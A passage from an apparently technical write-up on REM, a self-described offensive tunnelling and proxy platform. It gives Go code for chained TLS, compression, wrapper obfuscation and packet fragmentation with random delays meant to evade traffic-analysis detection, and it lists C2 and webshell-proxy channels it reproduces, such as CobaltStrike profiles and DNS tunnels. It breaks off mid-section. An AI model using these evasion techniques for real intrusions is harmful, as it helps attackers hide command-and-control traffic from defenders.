<span class="w">    </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithWrappers</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="nx">wrapperOpts</span><span class="p">),</span><span class="w">  </span><span class="c1">// Random Wrapper obfuscation (2.3.2)</span>
<span class="w">    </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithCompression</span><span class="p">(),</span><span class="w">                  </span><span class="c1">// Compression breaks statistical features (2.1.2)</span>
<span class="w">    </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithTLSInTLS</span><span class="p">(),</span><span class="w">                     </span><span class="c1">// Inner TLS (2.1.2)</span>
<span class="w">    </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithTLS</span><span class="p">(),</span><span class="w">                          </span><span class="c1">// Outer TLS (2.1.2)</span>
<span class="p">}</span>
<span class="c1">// Effect: Wrapper → Compression → TLS → TLS</span>
<span class="c1">//      Multi-layer nesting, each layer has valid certs, extremely hard to identify</span>
</code></pre></div>
<ul>
<li><strong>Flexible Combination of Protocol Stack Capabilities:</strong> Tunnel, Simplex, ARQ, Wrapper, <code>proxyclient</code>, and other independent capabilities are flexibly orchestrated via the priority mechanism.</li>
<li><strong>Rapid Scenario Reconfiguration:</strong> Dynamic control of Hook configuration via URL parameters (e.g., <code>?tls&amp;compress&amp;wrapper=aes-cfb,xor</code>) without modifying code.</li>
<li><strong>Fine-grained Control of Traffic Characteristics:</strong> Precise control of final traffic characteristics (encryption levels, compression ratios, TLS nesting depth) via Hook chain order and parameters.</li>
<li><strong>Automated Counter-measures:</strong> <code>GenerateRandomWrapperOptions(2, 4)</code> automatically generates 2-4 random Wrapper layers, ensuring the encryption chain is different for every connection.</li>
</ul>
<p>Through the Hook mechanism, REM achieves the shift from a "Fixed Protocol Stack" to an "Orchestratable Protocol Stack," which is one of its core capabilities as an offensive infrastructure platform.</p>
<h4 id="252-statistical-countermeasures">2.5.2 Statistical Countermeasures<a class="headerlink" href="#252-statistical-countermeasures" title="Permanent link">&para;</a></h4>
<p>The Hook mechanism has another value: because it is transport-agnostic, we didn't introduce it in 2.1. In 2.1, we described the essence of this mechanism as secondary operations on <code>Conn</code>. Beyond encapsulating various technologies from 2.1-2.4 as tunnel hooks, we can also add independent hook configurations, such as splitting a packet into multiple packets or adding random time series to each packet.</p>
<p>Case: Packet Fragmentation</p>
<p>Fragmentation Hook is used to break statistical characteristics of traffic and evade traffic analysis-based detection:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// Statistical Countermeasure Hook: Packet Fragmentation</span>
<span class="kd">func</span><span class="w"> </span><span class="nx">WithPacketFragmentation</span><span class="p">(</span><span class="nx">maxPacketSize</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">randomDelay</span><span class="w"> </span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nx">TunnelOption</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">newFuncTunnelOption</span><span class="p">(</span><span class="kd">func</span><span class="p">(</span><span class="nx">do</span><span class="w"> </span><span class="o">*</span><span class="nx">TunnelService</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">do</span><span class="p">.</span><span class="nx">afterHooks</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">do</span><span class="p">.</span><span class="nx">afterHooks</span><span class="p">,</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">AfterHook</span><span class="p">{</span>
<span class="w">            </span><span class="nx">Priority</span><span class="p">:</span><span class="w"> </span><span class="nx">DefaultHookPriority</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">15</span><span class="p">,</span>
<span class="w">            </span><span class="nx">DialerHook</span><span class="p">:</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// Wrap Conn, implement packet fragmentation</span>
<span class="w">                </span><span class="nx">fragConn</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">FragmentationConn</span><span class="p">{</span>
<span class="w">                    </span><span class="nx">Conn</span><span class="p">:</span><span class="w">          </span><span class="nx">c</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">maxPacketSize</span><span class="p">:</span><span class="w"> </span><span class="nx">maxPacketSize</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">randomDelay</span><span class="p">:</span><span class="w">   </span><span class="nx">randomDelay</span><span class="p">,</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">fragConn</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
<span class="w">            </span><span class="p">},</span>
<span class="w">        </span><span class="p">})</span>
<span class="w">    </span><span class="p">})</span>
<span class="p">}</span>

<span class="c1">// Packet Fragmentation Conn Implementation (Conceptual Example)</span>
<span class="kd">type</span><span class="w"> </span><span class="nx">FragmentationConn</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span>
<span class="w">    </span><span class="nx">maxPacketSize</span><span class="w"> </span><span class="kt">int</span>
<span class="w">    </span><span class="nx">randomDelay</span><span class="w">   </span><span class="kt">bool</span>
<span class="p">}</span>

<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">f</span><span class="w"> </span><span class="o">*</span><span class="nx">FragmentationConn</span><span class="p">)</span><span class="w"> </span><span class="nx">Write</span><span class="p">(</span><span class="nx">p</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Countermeasure: Split large packets into multiple small packets</span>
<span class="w">    </span><span class="nx">totalLen</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span>
<span class="w">    </span><span class="nx">offset</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="mi">0</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">offset</span><span class="w"> </span><span class="p">&lt;</span><span class="w"> </span><span class="nx">totalLen</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Calculate packet size for this send</span>
<span class="w">        </span><span class="nx">chunkSize</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">f</span><span class="p">.</span><span class="nx">maxPacketSize</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">offset</span><span class="o">+</span><span class="nx">chunkSize</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="nx">totalLen</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">chunkSize</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">totalLen</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">offset</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="c1">// Send fragmented small packet</span>
<span class="w">        </span><span class="nx">chunk</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">p</span><span class="p">[</span><span class="nx">offset</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">offset</span><span class="o">+</span><span class="nx">chunkSize</span><span class="p">]</span>
<span class="w">        </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">f</span><span class="p">.</span><span class="nx">Conn</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">chunk</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">offset</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="nx">offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">chunkSize</span>

<span class="w">        </span><span class="c1">// Optional: Add random delay, simulate normal interactive traffic</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">f</span><span class="p">.</span><span class="nx">randomDelay</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">offset</span><span class="w"> </span><span class="p">&lt;</span><span class="w"> </span><span class="nx">totalLen</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">time</span><span class="p">.</span><span class="nx">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">(</span><span class="nx">rand</span><span class="p">.</span><span class="nx">Intn</span><span class="p">(</span><span class="mi">50</span><span class="p">))</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Millisecond</span><span class="p">)</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">totalLen</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
<span class="p">}</span>
</code></pre></div>
<p>Actual Effect of Statistical Countermeasures:</p>
<p>Assuming original traffic is a 5KB large packet:</p>
<ul>
<li><strong>Original Traffic Feature:</strong> <code>[=====5000 bytes=====]</code> (Single large packet, obvious burst traffic)</li>
</ul>
<p>After applying Fragmentation Hook (<code>maxPacketSize=50</code>):</p>
<ul>
<li><code>[50] [50] [50] ... [50] [50]</code> (Total 100 small packets)</li>
<li><strong>Feature:</strong> Multiple small packets, similar to normal interactive traffic (like SSH, HTTP requests).</li>
</ul>
<p>If <code>randomDelay</code> is enabled:</p>
<ul>
<li><code>[50]--5ms--[50]--23ms--[50]--8ms--...</code></li>
<li><strong>Feature:</strong> Random packet intervals, closer to the time characteristics of human operation.</li>
</ul>
<p>This fragmentation technique effectively disrupts statistical characteristics:</p>
<ul>
<li><strong>Packet Size Distribution:</strong> Transforms large packets into small ones, fitting normal interactive traffic distribution.</li>
<li><strong>Burst Characteristics:</strong> Eliminates obvious data bursts, making traffic smoother.</li>
<li><strong>Timing Characteristics:</strong> Simulates human operation intervals via random delays.</li>
<li><strong>Detection Evasion:</strong> Bypasses anomaly detection rules based on packet size (e.g., alerts for "single packet &gt; 4KB").</li>
</ul>
<p>Hook Chain Combination Usage:</p>
<p>Multiple Hooks can be combined and executed in priority order:</p>
<div class="highlight"><pre><span></span><code><span class="nx">tunnel</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">NewTunnel</span><span class="p">(</span>
<span class="w">    </span><span class="nx">WithPacketFragmentation</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">),</span><span class="w">      </span><span class="c1">// Priority 25: Fragment first</span>
<span class="w">    </span><span class="nx">WithCompression</span><span class="p">(),</span><span class="w">                        </span><span class="c1">// Priority 25: Then compress</span>
<span class="w">    </span><span class="nx">WithTLS</span><span class="p">(),</span><span class="w">                               </span><span class="c1">// Priority MaxInt-10: Finally TLS encrypt</span>
<span class="p">)</span>
</code></pre></div>
<p><strong>Data Flow Processing Order:</strong></p>
<div class="highlight"><pre><span></span><code>Raw Data
  → Fragmentation (100 bytes/packet)
  → Compression
  → TLS Encryption
  → Network Transmission
</code></pre></div>
<p>Through the Hook mechanism, REM can inject various processing logic at different stages of connection establishment: standard operations like TLS encryption, data compression, and Wrapper obfuscation, as well as statistical countermeasures like delay injection, traffic shaping, and padding. These Hooks execute in priority order, with each layer focusing on a specific function, providing flexible extension capabilities for the transport layer.</p>
<hr />
<h2 id="3-blossoming-offensive-protocol-stack-application-scenarios">3. Blossoming Offensive Protocol Stack Application Scenarios<a class="headerlink" href="#3-blossoming-offensive-protocol-stack-application-scenarios" title="Permanent link">&para;</a></h2>
<p>Based on the attack-oriented protocol stack reconstruction architecture built in Chapter 2, REM demonstrates significant improvements in actual network confrontation scenarios. These scenarios go beyond the functional enhancements of traditional proxy tools; through systematic protocol stack reconstruction, they effectively improve the methods and outcomes of network-side offensive operations.</p>
<p>Through protocol-agnostic transport abstraction at the transport layer, dynamic encryption/obfuscation chains at the presentation layer, lightweight multiplexing at the session layer, and protocol-boundary-free integration via <code>proxyclient</code>, the REM architecture provides effective infrastructure support for various advanced attack applications.</p>
<p>Ultimately, we easily reproduced the capabilities of various tools using REM and conducted more innovative practices.</p>
<table>
<thead>
<tr>
<th><strong>Tool Name</strong></th>
<th><strong>Type</strong></th>
<th><strong>REM Reproduction Capability (Channel/Protocol)</strong></th>
<th><strong>Notes</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>frp</strong></td>
<td>Port Forwarding/Tunnel</td>
<td>Provides TCP/UDP port forwarding, reverse proxy, multi-port listening, etc.</td>
<td>Core functions fully implemented</td>
</tr>
<tr>
<td><strong>gost</strong></td>
<td>Tunnel/Proxy</td>
<td>Simulates multi-protocol tunnels (TCP, UDP, WebSocket), forwarding, and proxy functions.</td>
<td>Core functions fully implemented</td>
</tr>
<tr>
<td><strong>nps</strong></td>
<td>Port Forwarding/Proxy</td>
<td>Provides TCP/UDP port forwarding, reverse proxy, SOCKS5/HTTP proxy, etc.</td>
<td>Core functions fully implemented</td>
</tr>
<tr>
<td><strong>spp</strong></td>
<td>Port Forwarding</td>
<td>Simulates TCP/UDP port forwarding functions.</td>
<td>Core functions fully implemented</td>
</tr>
<tr>
<td><strong>pingtunnel</strong></td>
<td>ICMP Tunnel</td>
<td>Implements tunnel communication based on ICMP Echo/Reply.</td>
<td>Implemented via kcp+icmp</td>
</tr>
<tr>
<td><strong>iox</strong></td>
<td>Port Forwarding</td>
<td>Provides TCP/UDP-based port forwarding.</td>
<td>Port forwarding implemented in App Layer</td>
</tr>
<tr>
<td><strong>GC2-sheet</strong></td>
<td>LolC2 (Cloud Service Channel)</td>
<td>Simulates C2 channels exchanging data via Google Sheets and other cloud service APIs.</td>
<td>Implemented via simplex+google/graph api</td>
</tr>
<tr>
<td><strong>dnstunnel</strong></td>
<td>DNS Tunnel</td>
<td>Simulates DNS query/response mechanism, hiding data in DNS traffic.</td>
<td>Implemented via simplex+dns</td>
</tr>
<tr>
<td><strong>CobaltStrike Profile</strong></td>
<td>C2 Traffic Masquerade</td>
<td>Simulates CobaltStrike C2 framework traffic profile characteristics.</td>
<td>Can simulate any HTTP protocol via padding wrapper</td>
</tr>
<tr>
<td><strong>CobaltStrike ExternalC2</strong></td>
<td>C2 Extension Interface</td>
<td>Simulates CobaltStrike ExternalC2 protocol as an external communication channel for C2.</td>
<td>ExternalC2 implemented in App Layer</td>
</tr>
<tr>
<td><strong>suo5</strong></td>
<td>WebShell Proxy</td>
<td>Simulates suo5 WebShell proxy protocol, proxying via WebShell.</td>
<td>suo5 client implemented via proxyclient</td>
</tr>
<tr>
<td><strong>neoreg</strong></td>
<td>WebShell Proxy</td>
<td>Simulates neoreg WebShell proxy protocol, proxying via WebShell.</td>
<td>neoreg client implemented via proxyclient</td>
</tr>
<tr>
<td><strong>Xray</strong></td>
<td>Proxy/Tunnel Platform</td>
<td>Simulates Vless, Trojan protocols and routing/transport config (TLS, WS, HTTP/2).</td>
<td>Can be integrated into REM. Although REM can achieve similar functions, capabilities are similar to original; no plan to use REM here.</td>
</tr>
<tr>
<td><strong>Reality</strong></td>
<td>TLS Masquerade Protocol</td>
<td>Simulates Reality traffic masquerading (TLS traffic as normal site traffic).</td>
<td>Can be integrated into REM.</td>
</tr>
</tbody>
</table>
<h3 id="31-application-layer-abstraction-bidirectional-protocol-processing-for-outbound-inbound">3.1 Application Layer Abstraction: Bidirectional Protocol Processing for Outbound &amp; Inbound<a class="headerlink" href="#31-application-layer-abstraction-bidirectional-protocol-processing-for-outbound-inbound" title="Permanent link">&para;</a></h3>
<p><strong>Application Layer Abstraction Requirements:</strong> The capabilities built in Chapter 2 for Transport, Presentation, and Session layers provide REM with a powerful foundation, but these capabilities ultimately need to be exposed to users and tools via application layer protocols. REM implements a unified processing framework for application layer protocols through two core abstractions: <strong>Outbound</strong> and <strong>Inbound</strong>.</p>
<p>In traditional network tools, each application protocol (SOCKS5, HTTP Proxy, Shadowsocks, etc.) requires independent implementation of client and server logic, leading to code duplication and difficulty in reuse. REM decouples application layer protocol processing into two directional operations via Outbound/Inbound abstraction, combined with a dynamic registration mechanism to achieve flexible combination and extension of protocols.</p>
<h4 id="311-outbound-protocol-server-handling-outgoing-connections">3.1.1 Outbound: Protocol Server Handling Outgoing Connections<a class="headerlink" href="#311-outbound-protocol-server-handling-outgoing-connections" title="Permanent link">&para;</a></h4>
<p><strong>Core Function of Outbound:</strong> Handles protocol connection requests from user tools, parses protocol content, and establishes connections to target addresses. Outbound acts as the protocol server, responsible for understanding and responding to protocol requests.</p>
<p><strong>Outbound Interface Definition:</strong></p>
<div class="highlight"><pre><span></span><code><span class="kd">type</span><span class="w"> </span><span class="nx">Outbound</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Name</span><span class="p">()</span><span class="w"> </span><span class="kt">string</span>
<span class="w">    </span><span class="nx">Handle</span><span class="p">(</span><span class="nx">conn</span><span class="w"> </span><span class="nx">io</span><span class="p">.</span><span class="nx">ReadWriteCloser</span><span class="p">,</span><span class="w"> </span><span class="nx">realConn</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span>
<span class="w">    </span><span class="nx">ToClash</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="nx">utils</span><span class="p">.</span><span class="nx">Proxies</span>
<span class="p">}</span>

<span class="kd">type</span><span class="w"> </span><span class="nx">OutboundCreatorFn</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">options</span><span class="w"> </span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">dial</span><span class="w"> </span><span class="nx">ContextDialer</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">Outbound</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span>
</code></pre></div>
<ul>
<li><code>conn io.ReadWriteCloser</code>: Connection with the user tool (connection processed by Wrapper encryption and Mux multiplexing).</li>
<li><code>realConn net.Conn</code>: Underlying transport layer connection (net.Conn provided by Tunnel).</li>
<li><code>dial ContextDialer</code>: Dialer used to initiate connections to target addresses, which can be a proxy dialer provided by <code>proxyclient</code>.</li>
</ul>
<p><strong>SOCKS5 Outbound Implementation Example (based on actual code from socks5.go):</strong></p>
<div class="highlight"><pre><span></span><code><span class="kd">type</span><span class="w"> </span><span class="nx">Socks5Plugin</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Server</span><span class="w"> </span><span class="o">*</span><span class="nx">socks5</span><span class="p">.</span><span class="nx">Server</span>
<span class="w">    </span><span class="o">*</span><span class="nx">core</span><span class="p">.</span><span class="nx">PluginOption</span>
<span class="p">}</span>

<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">sp</span><span class="w"> </span><span class="o">*</span><span class="nx">Socks5Plugin</span><span class="p">)</span><span class="w"> </span><span class="nx">Handle</span><span class="p">(</span><span class="nx">conn</span><span class="w"> </span><span class="nx">io</span><span class="p">.</span><span class="nx">ReadWriteCloser</span><span class="p">,</span><span class="w"> </span><span class="nx">realConn</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Wrap as complete net.Conn</span>
<span class="w">    </span><span class="nx">wrapConn</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">cio</span><span class="p">.</span><span class="nx">WrapConn</span><span class="p">(</span><span class="nx">realConn</span><span class="p">,</span><span class="w"> </span><span class="nx">conn</span><span class="p">)</span>

<span class="w">    </span><span class="c1">// Parse SOCKS5 protocol request</span>
<span class="w">    </span><span class="nx">ctx</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Background</span><span class="p">()</span>
<span class="w">    </span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">sp</span><span class="p">.</span><span class="nx">Server</span><span class="p">.</span><span class="nx">ParseConn</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">wrapConn</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Use Server&#39;s Dial method to connect to target address</span>
<span class="w">    </span><span class="c1">// Dial here might be provided by proxyclient, supporting multi-level proxies</span>
<span class="w">    </span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">sp</span><span class="p">.</span><span class="nx">Server</span><span class="p">.</span><span class="nx">Dial</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">wrapConn</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
<span class="p">}</span>
</code></pre></div>
<p>The Outbound workflow involves receiving and parsing SOCKS5 requests transmitted over encrypted multiplexed tunnels, then connecting to the real target via a <code>ContextDialer</code> (which may contain multi-level proxies), ultimately establishing a transparent data forwarding channel between the user tool and the target.</p>
<h4 id="312-inbound-relaying-protocol-requests-to-remote-ends">3.1.2 Inbound: Relaying Protocol Requests to Remote Ends<a class="headerlink" href="#312-inbound-relaying-protocol-requests-to-remote-ends" title="Permanent link">&para;</a></h4>
<p><strong>Core Function of Inbound:</strong> Relays locally received connections to a remote bridge connection via protocol format. Inbound acts as the protocol client, responsible for encoding local requests into protocol format and sending them to the remote end.</p>
<p><strong>Inbound Interface Definition:</strong></p>
<div class="highlight"><pre><span></span><code><span class="kd">type</span><span class="w"> </span><span class="nx">Inbound</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Name</span><span class="p">()</span><span class="w"> </span><span class="kt">string</span>
<span class="w">    </span><span class="nx">Relay</span><span class="p">(</span><span class="nx">conn</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="nx">bridge</span><span class="w"> </span><span class="nx">io</span><span class="p">.</span><span class="nx">ReadWriteCloser</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">type</span><span class="w"> </span><span class="nx">InboundCreatorFn</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">options</span><span class="w"> </span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">Inbound</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span>
</code></pre></div>
<p><strong>Key Parameters:</strong></p>
<ul>
<li>
<p><code>conn net.Conn</code>: Locally received connection (e.g., TCP connection received by port forwarding).</p>
</li>
<li>
<p><code>bridge io.ReadWriteCloser</code>: Bridge connection to the remote end (connection processed by Tunnel, Wrapper, Mux).</p>
</li>
</ul>
<p><strong>SOCKS5 Inbound Implementation Example (based on actual code from socks5.go):</strong></p>
<div class="highlight"><pre><span></span><code><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">sp</span><span class="w"> </span><span class="o">*</span><span class="nx">Socks5Plugin</span><span class="p">)</span><span class="w"> </span><span class="nx">Relay</span><span class="p">(</span><span class="nx">conn</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="nx">bridge</span><span class="w"> </span><span class="nx">io</span><span class="p">.</span><span class="nx">ReadWriteCloser</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Parse SOCKS5 request from local connection</span>
<span class="w">    </span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">sp</span><span class="p">.</span><span class="nx">Server</span><span class="p">.</span><span class="nx">ParseConn</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">Background</span><span class="p">(),</span><span class="w"> </span><span class="nx">conn</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Build SOCKS5 relay request, send to remote bridge</span>
<span class="w">    </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">bridge</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">BuildRelay</span><span class="p">())</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Read SOCKS5 reply from remote bridge</span>
<span class="w">    </span><span class="nx">rep</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">socks5</span><span class="p">.</span><span class="nx">ReadReply</span><span class="p">(</span><span class="nx">bridge</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">rep</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">socks5</span><span class="p">.</span><span class="nx">RepSuccess</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Errorf</span><span class="p">(</span><span class="s">&quot;relay failed: %v&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">rep</span><span class="p">)</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Send success reply to local connection</span>
<span class="w">    </span><span class="nx">conn</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">socks5</span><span class="p">.</span><span class="nx">BuildSuccessReply</span><span class="p">(</span><span class="nx">addr</span><span class="p">))</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">conn</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
<span class="p">}</span>
</code></pre></div>
<p><strong>Inbound Workflow:</strong></p>
